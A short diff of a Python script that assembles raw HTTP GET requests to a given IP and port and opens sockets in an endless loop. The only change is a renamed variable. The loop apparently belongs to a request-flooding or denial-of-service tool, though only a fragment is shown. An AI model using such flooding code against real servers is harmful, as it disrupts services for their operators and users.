@@ -42,7 +42,7 @@ def start():
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    main_req  = target_host + socks2 + http + content + length + "\r\n"
+    main_req  = target_host + socks + http + content + length + "\r\n"
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
